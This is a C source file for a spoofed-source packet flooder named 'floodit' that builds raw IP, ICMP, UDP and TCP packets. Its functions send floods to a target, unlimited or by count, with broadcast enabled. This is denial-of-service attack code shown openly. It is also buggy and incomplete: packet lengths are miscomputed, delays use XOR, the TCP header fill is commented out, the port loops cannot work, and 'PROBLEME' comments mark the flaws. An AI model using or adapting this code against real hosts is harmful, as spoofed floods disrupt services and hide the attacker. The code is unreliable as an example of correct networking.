#include <sys/socket.h>
#include <arpa/inet.h>	// htons, inet_addr ...
#include <linux/ip.h>   // IP header
#include <linux/icmp.h>	  // ICMP header
#include <linux/udp.h>	  // UDP header
#include <linux/tcp.h>	  // TCP header
#include <stdio.h>   // perror, printf
#include <stdlib.h>   // Flags, exit
#include <string.h>	// memset, memcpy
#include <unistd.h>	// close, getuid, getopt
#include <errno.h>

struct icmphdr *icmp;
struct tcphdr *tcp;
struct udphdr *udp;

/* Calculates the checksum of the ip header.*/
unsigned short csum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}

/* Print usage */
void usage()
{
	printf("Usage : ./floodit -t {tcp | udp | icmp} -s <spoofed_ip> [OPTIONS] <ip_target>\n\n");
	printf("  OPTIONS :\n\t\t-q level : select the speed level 1, 2 or 3, (DEFAULT 1)\n");
	printf("\t\t-n number : specifies the number of packet send or 0 for an unlimited flood, (DEFAULT 0)\n");
	printf("\t\t-p port : specifies the destination port, (DEFAULT 80)\n");
	printf("\t\t-s spoofed_ip : specifies the spoofed IP address\n");
	printf("\t\t-h, --help : print the help !\n\n");

	printf("Example : ./floodit -t icmp -q 2 -n 0 -s 192.168.12.5 192.168.12.15\n");
}

/* Send UDP or ICMP packet */
void sendflood_to(int sock, const char *packet, struct sockaddr_in *dest)
{
	if(sendto(sock, (const void *) packet, sizeof(packet)*strlen(packet), 0, (struct sockaddr *) dest, sizeof(*dest)) == -1) {
		perror("sendto()");
		exit(EXIT_FAILURE);
	}
}


/* Send TCP packet */
void sendflood(int sock, char *packet)
{
	if(send(sock, packet, sizeof(packet), 0) == -1) {
		perror("send()");
		exit(EXIT_FAILURE);
	}
}

void send_inf_loop(char *proto, int sock, char *packet, struct iphdr *ip,
				 struct sockaddr_in dest_addr, unsigned int speed)
{
	while(1) {
		// Calculate checksums
		ip->check = csum((unsigned short *)packet, ip->tot_len);

		if(strncmp(proto,"icmp", 4) == 0)
			icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr));
		else if(strncmp(proto,"udp", 3) == 0)
			udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
		else
			tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));

		// Send packets
		if(strstr(proto,"icmp") || strstr(proto,"udp"))
			sendflood_to(sock, packet, &dest_addr);
		else
			sendflood(sock, packet);

		usleep(speed^10);	// PROBLEME
		printf(".");
	}
}

void send_nloops(int nbpacket, char *proto, int sock, char *packet, struct iphdr *ip,
					 struct sockaddr_in dest_addr, unsigned int speed)
{
	int i;

	for(i = 0 ; i < nbpacket ; i++) {
		// Calculate checksums
		ip->check = csum((unsigned short *)packet, ip->tot_len);
		if(strncmp(proto,"icmp", 4) == 0) 
			icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr));
		else if(strncmp(proto,"udp", 3) == 0)
			udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
		else
			tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
		// Send packets
		if(strstr(proto,"icmp") || strstr(proto,"udp"))
			sendflood_to(sock, packet, &dest_addr);
		else
			sendflood(sock, packet);

		usleep(speed ^ 100); // PROBLEME
		printf(".");
	}	

	printf("\nDone : %d packets send !\n", i);
}

/* Fill the IP header */
void ip_header(struct iphdr *ip, int packet_size, int proto, const char *saddr, const char *daddr)
{
	ip->version = IPVERSION;
	ip->ihl = 5;
	ip->tos = IPTOS_LOWDELAY;
	ip->tot_len = packet_size;
	ip->id = rand();
	ip->frag_off = 0;
	ip->ttl = MAXTTL;
	ip->protocol = proto;
	ip->check = 0;	// initialize to 0
	ip->saddr = inet_addr(saddr);	// Target
	ip->daddr = inet_addr(daddr);	// IP Broadcast
}

/* Fill the ICMP header */
void icmp_header()
{
	icmp->type = ICMP_ECHO; // ECHO REQUEST
	icmp->code = 0; // DEFAULT VALUE
	icmp->checksum = 0;
	icmp->un.echo.id = rand();
	icmp->un.echo.sequence = rand();
}

void tcp_header(int port_dst) // PROBLEME DANS LE REMPLISSAGE
{
	// Fill the TCP header
/*	while(tcp->source = rand(), (tcp->source < 1024) && (tcp->source > 65535));
	tcp->dest = htons(port_dst);
	tcp->seq = 0;
	tcp->ack_seq = 0;
	tcp->doff = 0;
	tcp->res1 = 0;
	tcp->cwr = 0;
	tcp->ece = 0;
	tcp->urg = 0;
	tcp->ack = 0;
	tcp->psh = 0;
	tcp->rst = 0;
	tcp->syn = 1;
	tcp->fin = 0;
	tcp->window = 0;
	tcp->check = 0;
	tcp->urg_ptr = 0;	*/
}

void udp_header(int port_dst)
{
	// Fill the UDP header
	while(udp->source = rand(), (udp->source < 1024) && (udp->source ) > 65535 );
	udp->dest = htons(port_dst);
	udp->len = 16;
	udp->check = 0;
}

/* Init raw socket for flood ICMP */
int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const char *target,
				  const char *ip_dest, char *packet, const char *proto, int port)
{
	int sock;
	int sockopt = 1;	// Socket option : 1 = broadcast enable & IP HDR provide

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if(sock == -1) {
		perror("socket()");
		exit(EXIT_FAILURE);
	}

	// IP Header provide
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &sockopt, sizeof(sockopt)) == -1) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}

	// Enable Broadcast
	if(setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof(sockopt)) == -1) {
		perror("setockopt()");
		exit(EXIT_FAILURE);
	}

	// Mounts the packet headers
	if(strncmp(proto, "icmp", 4) == 0)
		icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
	else if(strncmp(proto, "tcp", 3) == 0) 
		tcp = (struct tcphdr *) (packet + sizeof(struct iphdr));
	else  
		udp = (struct udphdr *) (packet + sizeof(struct iphdr));

	ip = (struct iphdr *) packet;

	if(strncmp(proto, "icmp", 4) == 0) {
		// Fill the IP header
		ip_header(ip, sizeof(packet)*strlen(packet), 1, target, ip_dest);

		printf("Flood ICMP\n");

		//Fill the ICMP header
		icmp_header();
	}
	else if(strncmp(proto, "tcp", 3) == 0) {
		// Fill the IP header
		ip_header(ip, sizeof(packet)*strlen(packet), 6, target, ip_dest);

		printf("Flood TCP\n");

		// Fill the TCP header
		tcp_header(port);
	}
	else {
		// Fill the IP header
		ip_header(ip, sizeof(packet)*strlen(packet), 17, target, ip_dest);

		printf("Flood UDP\n");

		// Fill the UDP header
		udp_header(port);
	}

	// Interface dest
	dest_addr->sin_family = AF_INET;
	dest_addr->sin_addr.s_addr = inet_addr(ip_dest);
	if(strncmp(proto, "icmp", 4) != 0)
		dest_addr->sin_port = htons(port);

	if(strncmp(proto, "tcp", 3) == 0)
		if(connect(sock, (struct sockaddr *) dest_addr, sizeof(dest_addr)) == -1) {
			perror("connect()");
			exit(EXIT_FAILURE);
		}

	return sock;
}
